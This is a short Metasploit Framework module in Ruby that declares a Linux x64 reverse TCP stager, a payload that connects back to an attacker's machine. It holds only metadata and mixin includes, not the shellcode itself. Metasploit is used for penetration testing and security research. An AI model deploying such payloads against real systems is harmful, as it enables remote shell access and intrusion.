##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 130

  include Msf::Payload::Stager
  include Msf::Payload::Linux::X64::ReverseTcp

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Reverse TCP Stager',
        'Description' => 'Connect back to the attacker',
        'Author' => ['ricky', 'tkmru'],
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'Arch' => ARCH_X64,
        'Handler' => Msf::Handler::ReverseTcp,
        'Stager' => { 'Payload' => '' }
      )
    )
  end
end
